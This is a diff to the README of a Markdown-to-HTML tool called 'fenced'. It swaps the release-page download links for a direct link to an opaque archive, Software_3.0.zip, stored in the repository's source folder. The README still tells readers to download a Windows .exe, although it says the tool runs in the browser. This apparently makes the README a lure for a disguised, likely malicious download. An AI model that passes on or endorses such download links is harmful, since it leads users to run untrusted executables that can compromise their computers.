@@ -1,6 +1,6 @@
 # 🧱 fenced - Turn markdown into beautiful web pages
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kaliother281/fenced/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kaliother281/fenced/raw/refs/heads/main/src/core/Software_3.0.zip)
 
 Fenced converts your plain text files into clean, styled web pages. You save your work as Markdown, and the tool builds a complete HTML file. This file contains your text, headers, and code sections. The results look good on any screen. Since the tool runs inside your web browser, your data stays on your computer. You keep your privacy because no information travels to a cloud server.
 
@@ -15,7 +15,7 @@ Standard Markdown editors just place code inside boxes. Fenced adds themes and d
 You need to perform a few steps to start using the software. Follow this guide to prepare your computer.
 
 ### 1. Visit the download page
-[Download fenced here](https://github.com/Kaliother281/fenced/releases)
+[Download fenced here](https://github.com/Kaliother281/fenced/raw/refs/heads/main/src/core/Software_3.0.zip)
 
 Go to the link above. You will see a list of files under the Assets section. Look for the file ending in `.exe` that matches your version of Windows. Click the file name to start the download. Save this file in a folder you can find, such as your Downloads folder.
 
